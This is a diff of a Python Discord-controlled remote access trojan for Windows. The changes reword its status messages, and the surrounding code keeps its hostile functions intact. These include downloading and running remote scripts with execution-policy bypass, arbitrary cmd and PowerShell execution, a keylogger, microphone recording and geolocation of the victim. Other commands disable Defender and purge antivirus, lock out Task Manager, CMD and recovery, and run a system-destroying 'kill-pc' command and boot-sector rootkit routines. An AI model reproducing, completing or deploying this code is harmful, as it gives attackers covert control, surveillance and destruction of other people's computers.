@@ -3100,9 +3151,9 @@ async def cd(ctx, path: str):
         else:
             current_dir = os.path.join(current_dir, path)
         current_dir = os.path.normpath(current_dir)
-        await ctx.send(embed=create_embed("📁 Directory", f"Now: `{current_dir}`", 0x00ff00))
+        await ctx.send(embed=create_embed("📁 Directory", f"The working folder is now `{current_dir}`.", 0x00ff00))
     except Exception as e:
-        await ctx.send(f"Error: {e}")
+        await ctx.send(f"The folder could not be changed: {e}")
 
 
 @bot.command()
@@ -3119,9 +3170,9 @@ async def tree(ctx):
         if cur:
             chunks.append(cur)
         for i, chunk in enumerate(chunks):
-            await ctx.send(embed=create_embed(f"🌳 Tree {'(Part ' + str(i + 1) + ')' if len(chunks) > 1 else ''}", f"```{chunk}```", 0x3498db))
+            await ctx.send(embed=create_embed(f"🌳 Tree {'(Part ' + str(i + 1) + ')' if len(chunks) > 1 else ''}", f"The folder tree was generated and is shown below.\n```{chunk}```", 0x3498db))
     except Exception as e:
-        await ctx.send(f"Error: {e}")
+        await ctx.send(f"The tree could not be generated: {e}")
 
 
 @bot.command()
@@ -3129,24 +3180,24 @@ async def download(ctx, file: str):
     global current_dir
     path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
     if not os.path.exists(path):
-        await ctx.send(embed=create_embed("Error", "File does not exist", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "That file does not exist in the current folder.", 0xff0000))
         return
     if os.path.getsize(path) < 20 * 1024 * 1024:
-        await ctx.send(embed=create_embed("🔽 File", file, 0x00ff00), file=discord.File(path))
+        await ctx.send(embed=create_embed("🔽 File", f"The file `{file}` is attached to this message.", 0x00ff00), file=discord.File(path))
     else:
         link = upload_fileio(path)
-        await ctx.send(embed=create_embed("📎 Link", link or "Upload failed", 0x00ff00))
+        await ctx.send(embed=create_embed("📎 Link", link or "The file was too large and the external upload failed.", 0x00ff00))
 
 
 @bot.command()
 async def upload(ctx):
     global current_dir
     if not ctx.message.attachments:
-        await ctx.send("`📋` Attach a file with the .upload message.")
+        await ctx.send("You have to attach a file to the same message as the command.")
         return
     for attachment in ctx.message.attachments:
         await attachment.save(os.path.join(current_dir, attachment.filename))
-        await ctx.send(embed=create_embed("⬆️ Uploaded", f"`{attachment.filename}` -> `{current_dir}`", 0x00ff00))
+        await ctx.send(embed=create_embed("⬆️ Uploaded", f"`{attachment.filename}` was stored in `{current_dir}`.", 0x00ff00))
 
 
 @bot.command()
@@ -3158,17 +3209,17 @@ async def remove(ctx, *, file: str):
             shutil.rmtree(path)
         else:
             os.remove(path)
-        await ctx.send(embed=create_embed("🗑️ Deleted", file))
+        await ctx.send(embed=create_embed("🗑️ Deleted", f"`{file}` was removed from the disk.", 0x00ff00))
     except PermissionError:
         subprocess.run(["takeown", "/f", path, "/r"], capture_output=True)
         subprocess.run(["icacls", path, "/grant", "everyone:F", "/t"], capture_output=True)
         try:
             shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)
-            await ctx.send(embed=create_embed("🗑️ Deleted", f"{file} (with permissions)"))
+            await ctx.send(embed=create_embed("🗑️ Deleted", f"`{file}` was locked, so the permissions were taken over first and then it was removed.", 0x00ff00))
         except Exception as e:
-            await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+            await ctx.send(embed=create_embed("Error", f"The permissions were taken over but the delete still failed: {e}", 0xff0000))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The path could not be removed: {e}", 0xff0000))
 
 
 @bot.command(name="open")
@@ -3176,20 +3227,20 @@ async def open_path(ctx, *, file: str):
     global current_dir
     path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
     subprocess.Popen(["start", "", path], shell=True)
-    await ctx.send(embed=create_embed("📬 Opened", file, 0x00ff00))
+    await ctx.send(embed=create_embed("📬 Opened", f"`{file}` was opened with its default application.", 0x00ff00))
 
 
 @bot.command(aliases=["clear-bin"])
 async def empty_bin(ctx):
     ps("Clear-RecycleBin -Force -ErrorAction SilentlyContinue")
-    await ctx.send(embed=create_embed("🗑️ Recycle Bin", "Emptied.", 0x0084ff))
+    await ctx.send(embed=create_embed("🗑️ Recycle Bin", "The recycle bin was emptied on every drive.", 0x0084ff))
 
 
 @bot.command(aliases=["set-wallpaper", "wallpaper"])
 async def set_wallpaper(ctx, *, source: str = None):
     global current_dir
     if not source:
-        await ctx.send(embed=create_embed("Error", "Usage: `.wallpaper <file|url>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give a local file or a direct URL to the image.", 0xffa500))
         return
     if source.startswith("http"):
         target_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "wallpaper_temp.jpg")
@@ -3203,17 +3254,17 @@ async def set_wallpaper(ctx, *, source: str = None):
            f'{{ [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int u, string p, int f); }}\'; '
            f'[W]::SystemParametersInfo(20, 0, \'{target_path}\', 3)')
     ps(cmd)
-    await ctx.send(embed=create_embed("🖼️ Wallpaper", "Updated.", 0x0084ff))
+    await ctx.send(embed=create_embed("🖼️ Wallpaper", "The desktop wallpaper was replaced with the supplied image.", 0x0084ff))
 
 
 @bot.command(aliases=["scriptloader"])
 async def script_loader(ctx, url: str = None):
     if not url:
-        await ctx.send(embed=create_embed("Error", "Usage: `.scriptloader <url>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give a direct URL to a `.ps1` or a `.bat` file.", 0xffa500))
         return
     ext = ".ps1" if url.lower().endswith(".ps1") else ".bat" if url.lower().endswith(".bat") else None
     if not ext:
-        await ctx.send(embed=create_embed("Error", "URL must end with .bat or .ps1", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The URL has to end in `.bat` or `.ps1`.", 0xff0000))
         return
     path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"loaded_script{ext}")
     async with aiohttp.ClientSession() as session:
@@ -3222,8 +3273,8 @@ async def script_loader(ctx, url: str = None):
                 f.write(await resp.read())
     cmd = f'powershell -ExecutionPolicy Bypass -File "{path}"' if ext == ".ps1" else f'cmd.exe /c "{path}"'
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "Executed (no output)"
-    await ctx.send(embed=create_embed("⚙️ Script Executed", f"```{out}```", 0x0084ff))
+    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "The script ran but produced no output."
+    await ctx.send(embed=create_embed("⚙️ Script Executed", f"The script was downloaded and executed, this is what it returned:\n```{out}```", 0x0084ff))
 
 
 @bot.command()
@@ -3232,11 +3283,11 @@ async def blacklist(ctx, *, process: str):
     c = conn.cursor()
     c.execute("SELECT 1 FROM blacklist WHERE process_name = ?", (process,))
     if c.fetchone():
-        await ctx.send(embed=create_embed("Error", "Already in list", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "That process is already on the blacklist.", 0xFF0000))
     else:
         c.execute("INSERT INTO blacklist VALUES (?)", (process,))
         conn.commit()
-        await ctx.send(embed=create_embed("🚫 Blacklist", f"Blocked **{process}**.", 0xFF0000))
+        await ctx.send(embed=create_embed("🚫 Blacklist", f"**{process}** will now be killed every time it starts.", 0xFF0000))
     conn.close()
 
 
@@ -3247,7 +3298,7 @@ async def unblacklist(ctx, *, process: str):
     c.execute("DELETE FROM blacklist WHERE process_name = ?", (process,))
     conn.commit()
     conn.close()
-    await ctx.send(embed=create_embed("✅ Unblacklist", f"Unblocked **{process}**.", 0x00FF00))
+    await ctx.send(embed=create_embed("✅ Unblacklist", f"**{process}** was removed from the blacklist and can run again.", 0x00FF00))
 
 
 @bot.command(aliases=["block-domain"])
@@ -3255,7 +3306,7 @@ async def block_domain(ctx, *, domain: str):
     hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
     with builtins.open(hosts_path, "a") as f:
         f.write(f"\n127.0.0.1 {domain}\n")
-    await ctx.send(embed=create_embed("🚫 Domain Blocked", domain, 0xff0000))
+    await ctx.send(embed=create_embed("🚫 Domain Blocked", f"`{domain}` now resolves to localhost through the hosts file.", 0xff0000))
 
 
 @bot.command(aliases=["unblock-domain"])
@@ -3267,7 +3318,7 @@ async def unblock_domain(ctx, *, domain: str):
         for line in lines:
             if domain not in line:
                 f.write(line)
-    await ctx.send(embed=create_embed("✅ Domain Unblocked", domain, 0x00ff00))
+    await ctx.send(embed=create_embed("✅ Domain Unblocked", f"Every hosts entry containing `{domain}` was deleted.", 0x00ff00))
 
 
 @bot.command(aliases=["block-website"])
@@ -3289,9 +3340,9 @@ async def ip_locate(ctx):
             async with session.get(f"http://ip-api.com/json/{ip_addr}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query") as r:
                 data = await r.json()
         if data.get("status") != "success":
-            await ctx.send(embed=create_embed("Error", data.get("message", "Unknown"), 0xff0000))
+            await ctx.send(embed=create_embed("Error", data.get("message", "The lookup service rejected the request."), 0xff0000))
             return
-        e = create_embed("📍 IP Information", "", 0x3498db)
+        e = create_embed("📍 IP Information", "The public address of this machine was resolved to the following location.", 0x3498db)
         e.add_field(name="IP", value=f"```{data.get('query')}```", inline=False)
         e.add_field(name="City", value=data.get("city") or "N/A", inline=True)
         e.add_field(name="Country", value=data.get("country") or "N/A", inline=True)
@@ -3300,20 +3351,20 @@ async def ip_locate(ctx):
         e.add_field(name="AS", value=data.get("as") or "N/A", inline=False)
         await ctx.send(embed=e)
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The geolocation lookup failed: {e}", 0xff0000))
 
 
 @bot.command(aliases=["admin-check"])
 async def admin_check(ctx):
     if is_admin():
-        await ctx.send(embed=create_embed("👔 Admin", "Running as admin.", 0x00ff00))
+        await ctx.send(embed=create_embed("👔 Admin", "The process is running with administrator rights.", 0x00ff00))
     else:
-        await ctx.send(embed=create_embed("👔 No admin", "Not admin.", 0xff0000))
+        await ctx.send(embed=create_embed("👔 No admin", "The process is running without administrator rights.", 0xff0000))
 
 
 @bot.command(aliases=["idle-time"])
 async def idle_time(ctx):
-    await ctx.send(embed=create_embed("⌚ Idle Time", f"**{int(get_idle_time())}** seconds.", 0x3498db))
+    await ctx.send(embed=create_embed("⌚ Idle Time", f"Nobody has touched the keyboard or the mouse for **{int(get_idle_time())}** seconds.", 0x3498db))
 
 def ps(cmd):
     return subprocess.run(
@@ -3351,7 +3402,7 @@ def chunk_text(text, size=1900):
 
 
 async def send_long(target, text, code=True):
-    text = (text or "").strip() or "(no output)"
+    text = (text or "").strip() or "(No output)"
     for c in chunk_text(text):
         await target.send(f"```\n{c}\n```" if code else c)
 
@@ -3375,7 +3426,7 @@ def run_script_capture(path, *args):
 async def cmd(ctx, *, command: str):
     await ctx.message.add_reaction("📌")
     out = ((cmd_run(command).stdout or "") + (cmd_run(command).stderr or "")).strip()
-    await ctx.send(embed=create_embed("⬛ CMD", f"```{(out or 'Executed (no output)')[-1900:]}```", 0x0084ff))
+    await ctx.send(embed=create_embed("⬛ CMD", f"The command was executed through cmd.exe and returned the output below.\n```{(out or 'Executed (No output)')[-1900:]}```", 0x0084ff))
 
 
 @bot.command()
@@ -3383,36 +3434,36 @@ async def powershell(ctx, *, command: str):
     await ctx.message.add_reaction("📌")
     result = ps(command)
     out = ((result.stdout or "") + (result.stderr or "")).strip()
-    await ctx.send(embed=create_embed("🟦 PowerShell", f"```{(out or 'Executed (no output)')[-1900:]}```", 0x0084ff))
+    await ctx.send(embed=create_embed("🟦 PowerShell", f"The command was executed through PowerShell and returned the output below.\n```{(out or 'Executed (No output)')[-1900:]}```", 0x0084ff))
 
 
 @bot.command()
 async def key(ctx, *, keys: str):
     text = keys.replace("[ENTER]", "\n").replace("[SPACE]", " ").replace("[TAB]", "\t").replace("[ESC]", "\x1b")
     pyautogui.typewrite(text, interval=0.01)
-    await ctx.send(embed=create_embed("Keys", f"Sent: `{keys[:50]}`", 0x00ff00))
+    await ctx.send(embed=create_embed("Keys", f"The following text was typed into the focused window: `{keys[:50]}`", 0x00ff00))
 
 
 @bot.command(aliases=["keylogger-enable"])
 async def keylogger_enable(ctx):
     global keylogger_active
     keylogger_active = True
-    await ctx.send(embed=create_embed("🎹 Keylogger", "Enabled", 0x00ff00))
+    await ctx.send(embed=create_embed("🎹 Keylogger", "The global keyboard listener is active again and every keystroke will be buffered.", 0x00ff00))
 
 
 @bot.command(aliases=["keylogger-disable"])
 async def keylogger_disable(ctx):
     global keylogger_active
     keylogger_active = False
-    await ctx.send(embed=create_embed("🎹 Keylogger", "Disabled", 0xff0000))
+    await ctx.send(embed=create_embed("🎹 Keylogger", "The global keyboard listener was disabled and keystrokes are no longer buffered.", 0xff0000))
 
 
 @bot.command(aliases=["keylog"])
 async def keylog_dump(ctx):
     if flush_keylog():
-        await ctx.send(embed=create_embed("🎹 Keylogger", "Buffer flushed to #keys.", 0x00ff00))
+        await ctx.send(embed=create_embed("🎹 Keylogger", "The buffer was flushed and its contents were sent to the keys channel.", 0x00ff00))
     else:
-        await ctx.send(embed=create_embed("🎹 Keylogger", "Buffer empty.", 0x3498db))
+        await ctx.send(embed=create_embed("🎹 Keylogger", "The buffer was already empty, there was nothing to send.", 0x3498db))
 
 
 @bot.command(aliases=["record"])
@@ -3420,82 +3471,82 @@ async def record_now(ctx, seconds: int = 10):
     await ctx.message.add_reaction("🎙️")
     try:
         await asyncio.to_thread(record_and_send, seconds)
-        await ctx.send(embed=create_embed("🎙️ Recording", f"{seconds}s sent to #microphone.", 0x0084ff))
+        await ctx.send(embed=create_embed("🎙️ Recording", f"A **{seconds}** second clip was recorded from the microphone and sent to the microphone channel.", 0x0084ff))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The microphone could not be recorded: {e}", 0xff0000))
 
 
 @bot.command()
 async def website(ctx, *, url: str):
     subprocess.Popen(["start", url], shell=True)
-    await ctx.send(embed=create_embed("🌐 Web", f"Opening: {url}", 0x00ff00))
+    await ctx.send(embed=create_embed("🌐 Web", f"`{url}` was opened in the default browser.", 0x00ff00))
 
 
 @bot.command(aliases=["disable-cmd"])
 async def disable_cmd(ctx):
     os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 1 /f')
-    await ctx.send(embed=create_embed("💻 CMD", "Disabled.", 0xff0000))
+    await ctx.send(embed=create_embed("💻 CMD", "The command prompt was disabled for the current user through policy.", 0xff0000))
 
 
 @bot.command(aliases=["enable-cmd"])
 async def enable_cmd(ctx):
     os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 0 /f')
-    await ctx.send(embed=create_embed("💻 CMD", "Enabled.", 0x00ff00))
+    await ctx.send(embed=create_embed("💻 CMD", "The command prompt was enabled again for the current user.", 0x00ff00))
 
 
 @bot.command(aliases=["disable-taskmgr"])
 async def disable_taskmgr(ctx):
     os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
     os.system("taskkill /f /im taskmgr.exe")
-    await ctx.send(embed=create_embed("📊 Task Manager", "Disabled.", 0xFF0000))
+    await ctx.send(embed=create_embed("📊 Task Manager", "The Task Manager was disabled through policy and its open window was closed.", 0xFF0000))
 
 
 @bot.command(aliases=["enable-taskmgr"])
 async def enable_taskmgr(ctx):
     os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
-    await ctx.send(embed=create_embed("📊 Task Manager", "Enabled.", 0x00ff00))
+    await ctx.send(embed=create_embed("📊 Task Manager", "The Task Manager was enabled again and can be opened normally.", 0x00ff00))
 
 
 @bot.command(aliases=["disable-defender"])
 async def disable_defender(ctx):
     ps("Set-MpPreference -DisableRealtimeMonitoring $true")
-    await ctx.send(embed=create_embed("🛡️ Defender", "Real-time protection disabled.", 0xff0000))
+    await ctx.send(embed=create_embed("🛡️ Defender", "The real time protection of Defender was turned off.", 0xff0000))
 
 
 @bot.command(aliases=["enable-defender"])
 async def enable_defender(ctx):
     ps("Set-MpPreference -DisableRealtimeMonitoring $false")
-    await ctx.send(embed=create_embed("🛡️ Defender", "Real-time protection enabled.", 0x00ff00))
+    await ctx.send(embed=create_embed("🛡️ Defender", "The real time protection of Defender was turned back on.", 0x00ff00))
 
 
 @bot.command(aliases=["deactivate-windows"])
 async def deactivate_windows(ctx):
     subprocess.run(["cscript", "//nologo", r"C:\Windows\System32\slmgr.vbs", "/upk"],
                    capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    await ctx.send(embed=create_embed("🪟 Windows", "Deactivated.", 0xff0000))
+    await ctx.send(embed=create_embed("🪟 Windows", "The Windows product key was removed and the licence is now deactivated.", 0xff0000))
 
 
 @bot.command(aliases=["disable-reagentc"])
 async def disable_reagentc(ctx):
     subprocess.run(["reagentc", "/disable"], capture_output=True)
-    await ctx.send(embed=create_embed("🟣 ReAgentC", "Disabled.", 0xff0000))
+    await ctx.send(embed=create_embed("🟣 ReAgentC", "The recovery environment was disabled and WinRE can no longer be booted.", 0xff0000))
 
 
 @bot.command(aliases=["enable-reagentc"])
 async def enable_reagentc(ctx):
     subprocess.run(["reagentc", "/enable"], capture_output=True)
-    await ctx.send(embed=create_embed("🟣 ReAgentC", "Enabled.", 0x00ff00))
+    await ctx.send(embed=create_embed("🟣 ReAgentC", "The recovery environment was enabled again.", 0x00ff00))
 
 
 @bot.command(aliases=["kill-pc"])
 async def kill_pc(ctx):
-    await ctx.send(embed=create_embed("🚨 Confirmation", "Type `confirm-kill` to destroy the system.", 0xff0000))
+    await ctx.send(embed=create_embed("🚨 Confirmation", "This will destroy the installation and leave the machine unbootable. Type `confirm-kill` to continue.", 0xff0000))
 
 
 @bot.command(aliases=["set-dns"])
 async def dns(ctx, dns1: str = None, dns2: str = None):
     if not dns1:
-        await ctx.send(embed=create_embed("Error", "Usage: `.set-dns <primary> [secondary]`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give at least a primary DNS server, for example `.set-dns 1.1.1.1`.", 0xffa500))
         return
     await ctx.message.add_reaction("🌐")
     dns_list = f'"{dns1}"' if not dns2 else f'"{dns1}","{dns2}"'
@@ -3507,9 +3558,9 @@ foreach ($adapter in $adapters) {{
 '''
     result = ps(ps_script)
     if result.returncode == 0:
-        await ctx.send(embed=create_embed("🌐 DNS Updated", f"Primary: `{dns1}`", 0x0084ff))
+        await ctx.send(embed=create_embed("🌐 DNS Updated", f"Every connected adapter now uses `{dns1}` as its resolver.", 0x0084ff))
     else:
-        await ctx.send(embed=create_embed("Error", result.stderr[-1900:], 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The DNS servers could not be changed:\n```{result.stderr[-1800:]}```", 0xff0000))
 
 AV_KW = ["avast", "avg", "kaspersky", "eset", "bitdefender", "mcafee", "norton",
          "symantec", "malwarebytes", "avira", "sophos", "fortinet", "fortiedr",
@@ -3573,9 +3624,9 @@ async def purge_av_cmd(ctx):
     await ctx.message.add_reaction("🛡️")
     try:
         await asyncio.to_thread(purge_av)
-        await ctx.send(embed=create_embed("🛡️ AV", "Exclusions added, services disabled.", 0x00FF00))
+        await ctx.send(embed=create_embed("🛡️ AV", "Exclusions were added, the security services were stopped and set to not start again.", 0x00FF00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The purge could not be completed: {e}", 0xFF0000))
 
 @bot.command(aliases=["coords", "coordinates"])
 async def get_coords(ctx):
@@ -3603,58 +3654,58 @@ else { $l = $w.Position.Location; if ($l.IsUnknown) { Write-Output '{"error":"un
             async with aiohttp.ClientSession() as session:
                 async with session.get("http://ip-api.com/json/?fields=lat,lon") as r:
                     data = await r.json()
-            lat, lon, acc = data.get("lat"), data.get("lon"), "IP-based"
+            lat, lon, acc = data.get("lat"), data.get("lon"), "approximate, based on the IP"
         except Exception:
             pass
     if lat is None:
-        await ctx.send(embed=create_embed("Error", "Could not retrieve location.", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The location could not be resolved by the system sensor nor by the IP.", 0xff0000))
         return
-    await ctx.send(embed=create_embed("📍 Coordinates", f"`{lat}, {lon}` ({acc})\nhttps://www.google.com/maps?q={lat},{lon}", 0x0084ff))
+    await ctx.send(embed=create_embed("📍 Coordinates", f"The machine is around `{lat}, {lon}` ({acc}).\nhttps://www.google.com/maps?q={lat},{lon}", 0x0084ff))
 
 
 @bot.command(aliases=["mount-iso", "mount"])
 async def mount_iso(ctx, *, filename: str = None):
     global current_dir
     if not filename:
-        await ctx.send(embed=create_embed("Error", "Usage: `.mount <file.iso>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give the path to an image, for example `.mount disk.iso`.", 0xffa500))
         return
     path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
     result = ps(f"$i = Mount-DiskImage -ImagePath '{path}' -PassThru; ($i | Get-Volume).DriveLetter")
-    await ctx.send(embed=create_embed("💿 ISO Mounted", f"Drive: `{result.stdout.strip()}`", 0x0084ff))
+    await ctx.send(embed=create_embed("💿 ISO Mounted", f"The image was mounted on drive `{result.stdout.strip()}`.", 0x0084ff))
 
 
 @bot.command(aliases=["unmount-iso", "unmount"])
 async def unmount_iso(ctx, *, filename: str = None):
     global current_dir
     if not filename:
-        await ctx.send(embed=create_embed("Error", "Usage: `.unmount <file.iso|drive>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give the image path or the drive letter, for example `.unmount E`.", 0xffa500))
         return
     if len(filename) == 1 and filename.isalpha():
         ps(f"Dismount-DiskImage -DevicePath \\\\.\\{filename}:")
     else:
         path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
         ps(f"Dismount-DiskImage -ImagePath '{path}'")
-    await ctx.send(embed=create_embed("⏏️ ISO Unmounted", filename, 0x0084ff))
+    await ctx.send(embed=create_embed("⏏️ ISO Unmounted", f"`{filename}` was dismounted and its drive letter is free again.", 0x0084ff))
 
 
 @bot.command(aliases=["enable-device"])
 async def enable_device(ctx, index: int = None):
     if index is None:
-        await ctx.send(embed=create_embed("Error", "Usage: `.enable-device <n>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give the device index, for example `.enable-device 3`.", 0xffa500))
         return
     ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Enable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
     out = ps(ps_script).stdout.strip()
-    await ctx.send(embed=create_embed("🔌 Device", out if out != "NOT_FOUND" else f"Device {index} not found.", 0x0084ff))
+    await ctx.send(embed=create_embed("🔌 Device", out if out != "NOT_FOUND" else f"There is no device in position {index}.", 0x0084ff))
 
 
 @bot.command(aliases=["disable-device"])
 async def disable_device(ctx, index: int = None):
     if index is None:
-        await ctx.send(embed=create_embed("Error", "Usage: `.disable-device <n>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give the device index, for example `.disable-device 3`.", 0xffa500))
         return
     ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Disable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
     out = ps(ps_script).stdout.strip()
-    await ctx.send(embed=create_embed("🚫 Device", out if out != "NOT_FOUND" else f"Device {index} not found.", 0x0084ff))
+    await ctx.send(embed=create_embed("🚫 Device", out if out != "NOT_FOUND" else f"There is no device in position {index}.", 0x0084ff))
 
 _RK_MAGIC = b"LMBOOT1"
 _RK_SLOT = b"LMSLOT1\x00"
@@ -3970,7 +4021,7 @@ async def rootkit(ctx, sub: str = "status"):
             except Exception:
                 pass
         else:
-            msg = "sub: status | mbr | unmbr | slot | recover | esp | esp-clean | install | clean"
+            msg = "Valid subcommands are: status, mbr, unmbr, slot, recover, esp, esp-clean, install and clean."
     except Exception as e:
         msg = "Failed: {}".format(e)
         _crash("rootkit", traceback.format_exc())
@@ -3990,34 +4041,34 @@ speedtest -f json
         dl = round(data["download"]["bandwidth"] * 8 / 1e6, 2)
         ul = round(data["upload"]["bandwidth"] * 8 / 1e6, 2)
         ping = round(data["ping"]["latency"], 2)
-        await ctx.send(embed=create_embed("🚀 Speedtest", f"**Ping:** {ping} ms\n**Down:** {dl} Mbps\n**Up:** {ul} Mbps", 0x0084ff))
+        await ctx.send(embed=create_embed("🚀 Speedtest", f"The connection was measured with a latency of **{ping} ms**, **{dl} Mbps** down and **{ul} Mbps** up.", 0x0084ff))
     else:
-        await ctx.send(embed=create_embed("Error", "Speedtest unavailable.", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The speedtest client is not available and could not be installed.", 0xff0000))
 
 
 @bot.command(aliases=["alt-f4", "altf4"])
 async def alt_f4(ctx):
     ps("$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('%{F4}')")
-    await ctx.send(embed=create_embed("❌ Alt+F4", "Sent to active window.", 0x0084ff))
+    await ctx.send(embed=create_embed("❌ Alt+F4", "The combination Alt+F4 was sent to the window in the foreground.", 0x0084ff))
 
 
 @bot.command(aliases=["airplane-mode", "airplane"])
 async def airplane_mode(ctx, state: str = None):
     if not state or state.lower() not in ["on", "off"]:
-        await ctx.send(embed=create_embed("Error", "Usage: `.airplane <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`, for example `.airplane on`.", 0xffa500))
         return
     await ctx.message.add_reaction("✈️")
     if state.lower() == "on":
         ps("Disable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
     else:
         ps("Enable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
-    await ctx.send(embed=create_embed("✈️ Airplane Mode", state.upper(), 0x0084ff))
+    await ctx.send(embed=create_embed("✈️ Airplane Mode", "Every network adapter was dropped." if state.lower() == "on" else "Every network adapter was brought back up.", 0x0084ff))
 
 
 @bot.command(aliases=["mute"])
 async def toggle_mute(ctx):
     ps("$w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]173)")
-    await ctx.send(embed=create_embed("🔇 Mute", "Toggled.", 0x0084ff))
+    await ctx.send(embed=create_embed("🔇 Mute", "The mute state of the system was toggled.", 0x0084ff))
 
 
 @bot.command(aliases=["show-screens", "screens"])
@@ -4032,23 +4083,23 @@ foreach ($sc in $s) { $p = if ($sc.Primary) { " (Primary)" } else { "" }; $o += 
 $o -join "`n"
 '''
     out = ps(ps_script).stdout.strip()
-    await ctx.send(embed=create_embed("🖥️ Displays", f"```{out or 'None detected'}```", 0x0084ff))
+    await ctx.send(embed=create_embed("🖥️ Displays", f"These are the connected displays with their resolution:\n```{out or 'None detected'}```", 0x0084ff))
 
 
 @bot.command(aliases=["screen-mode"])
 async def screen_mode(ctx, mode: str = None):
     args = {"expand": "/extend", "duplicate": "/clone", "internal": "/internal", "external": "/external"}
     if not mode or mode.lower() not in args:
-        await ctx.send(embed=create_embed("Error", "Usage: `.screen-mode <expand|duplicate|internal|external>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to pick one of these modes: `expand`, `duplicate`, `internal` or `external`.", 0xffa500))
         return
     subprocess.run(f"displayswitch.exe {args[mode.lower()]}", shell=True)
-    await ctx.send(embed=create_embed("🖥️ Display Mode", mode.capitalize(), 0x0084ff))
+    await ctx.send(embed=create_embed("🖥️ Display Mode", f"The layout was switched to **{mode.lower()}**.", 0x0084ff))
 
 
 @bot.command(aliases=["rotate-screen", "rotate"])
 async def rotate_screen(ctx, degrees: int = None):
     if degrees not in (0, 90, 180, 270):
-        await ctx.send(embed=create_embed("Error", "Usage: `.rotate <0|90|180|270>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "The angle has to be 0, 90, 180 or 270.", 0xffa500))
         return
     try:
         dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
@@ -4056,33 +4107,33 @@ async def rotate_screen(ctx, degrees: int = None):
         if degrees in (90, 270):
             dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
         win32api.ChangeDisplaySettings(dm, 0)
-        await ctx.send(embed=create_embed("🖥️ Rotate", f"Screen rotated to {degrees}°.", 0x0084ff))
+        await ctx.send(embed=create_embed("🖥️ Rotate", f"The screen was rotated {degrees} degrees.", 0x0084ff))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The rotation could not be applied: {e}", 0xff0000))
 
 
 @bot.command(aliases=["lock-pc"])
 async def lock_pc(ctx):
     ctypes.windll.user32.LockWorkStation()
-    await ctx.send(embed=create_embed("🔒 Lock", "Workstation locked.", 0x0084ff))
+    await ctx.send(embed=create_embed("🔒 Lock", "The workstation was locked and the credentials are now required.", 0x0084ff))
 
 
 @bot.command(aliases=["sleep-pc"])
 async def sleep_pc(ctx):
     subprocess.Popen("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
-    await ctx.send(embed=create_embed("😴 Sleep", "Going to sleep.", 0x0084ff))
+    await ctx.send(embed=create_embed("😴 Sleep", "The machine was sent to sleep, it will resume on the next input.", 0x0084ff))
 
 
 @bot.command(aliases=["restart-pc"])
 async def restart_pc(ctx):
     os.system("shutdown /r /f /t 0")
-    await ctx.send(embed=create_embed("🔁 Restart", "Restarting.", 0xff0000))
